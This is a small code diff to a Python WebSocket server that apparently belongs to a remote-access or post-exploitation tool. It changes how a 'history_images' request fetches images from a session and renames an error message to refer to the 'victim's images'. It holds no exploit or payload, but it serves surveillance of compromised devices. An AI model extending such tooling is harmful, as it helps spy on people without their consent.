@@ -249,14 +249,14 @@ class WsServer:
             response["content"] = identified
             self.send_data(conn, json.dumps(response))
         elif action == 'history_images':
-            results = self.eggshell.server.multihandler.get_all_images(session_id)
+            results = self.eggshell.server.multihandler.get_all_images(para)
             if results:
                 response["status"] = "Success"
                 response["content_type"] = "json"
                 response["content"] = results
                 self.send_data(conn, json.dumps(response))
             else:
-                self.error_res(conn, "Error in fetching all images")
+                self.error_res(conn, "Error in fetching victim's images")
         else:
             self.error_res(conn, "Invalid Action")
         return
